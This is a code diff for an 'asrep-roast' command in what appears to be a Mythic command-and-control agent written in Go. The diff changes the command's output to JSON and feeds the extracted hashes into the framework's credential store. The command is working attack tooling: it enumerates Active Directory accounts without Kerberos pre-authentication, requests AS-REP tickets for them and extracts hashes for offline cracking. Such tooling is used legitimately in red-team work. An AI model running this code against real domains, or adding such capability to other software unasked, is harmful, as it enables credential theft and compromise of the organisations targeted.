@@ -21,8 +21,10 @@ import (
 
 type AsrepCommand struct{}
 
-func (c *AsrepCommand) Name() string        { return "asrep-roast" }
-func (c *AsrepCommand) Description() string { return "Request AS-REP tickets for accounts without Kerberos pre-authentication and extract hashes for offline cracking (T1558.004)" }
+func (c *AsrepCommand) Name() string { return "asrep-roast" }
+func (c *AsrepCommand) Description() string {
+	return "Request AS-REP tickets for accounts without Kerberos pre-authentication and extract hashes for offline cracking (T1558.004)"
+}
 
 type asrepArgs struct {
 	Server   string `json:"server"`
@@ -30,9 +32,9 @@ type asrepArgs struct {
 	Realm    string `json:"realm"`
 	Username string `json:"username"`
 	Password string `json:"password"`
-	Account  string `json:"account"`  // optional: specific account to roast
-	BaseDN   string `json:"base_dn"`  // optional: LDAP base DN
-	UseTLS   bool   `json:"use_tls"`  // optional: LDAPS for enumeration
+	Account  string `json:"account"` // optional: specific account to roast
+	BaseDN   string `json:"base_dn"` // optional: LDAP base DN
+	UseTLS   bool   `json:"use_tls"` // optional: LDAPS for enumeration
 }
 
 func (c *AsrepCommand) Execute(task structs.Task) structs.CommandResult {
@@ -116,34 +118,66 @@ func (c *AsrepCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	// Step 3: Send unauthenticated AS-REQ for each target
-	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("[*] AS-REP Roasting %d account(s) from %s (KDC: %s)\n", len(targets), args.Realm, args.Server))
-	sb.WriteString(strings.Repeat("-", 60) + "\n")
-
-	roasted := 0
+	var entries []asrepOutputEntry
+	var creds []structs.MythicCredential
 	for _, target := range targets {
 		hash, etypeName, err := requestAsrep(cfg, args.Realm, args.Server, target.Username)
 		if err != nil {
-			sb.WriteString(fmt.Sprintf("[!] Failed to roast %s: %v\n", target.Username, err))
+			entries = append(entries, asrepOutputEntry{
+				Account: target.Username,
+				Status:  "failed",
+				Error:   err.Error(),
+			})
 			continue
 		}
 
-		sb.WriteString(fmt.Sprintf("\n[+] %s (%s)\n", target.Username, etypeName))
-		sb.WriteString(hash + "\n")
-		roasted++
+		entries = append(entries, asrepOutputEntry{
+			Account: target.Username,
+			Etype:   etypeName,
+			Hash:    hash,
+			Status:  "roasted",
+		})
+
+		creds = append(creds, structs.MythicCredential{
+			CredentialType: "hash",
+			Realm:          args.Realm,
+			Account:        target.Username,
+			Credential:     hash,
+			Comment:        fmt.Sprintf("asrep-roast (%s)", etypeName),
+		})
 	}
 
-	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 18200 for RC4)\n", roasted, len(targets)))
+	data, err := json.Marshal(entries)
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error marshaling results: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
+	result := structs.CommandResult{
+		Output:    string(data),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 type asrepTarget struct {
 	Username string
+}
+
+// asrepOutputEntry represents an AS-REP roasted account for JSON output
+type asrepOutputEntry struct {
+	Account string `json:"account"`
+	Etype   string `json:"etype,omitempty"`
+	Hash    string `json:"hash,omitempty"`
+	Status  string `json:"status"` // "roasted" or "failed"
+	Error   string `json:"error,omitempty"`
 }
 
 func enumerateAsrepTargets(args asrepArgs) ([]asrepTarget, error) {
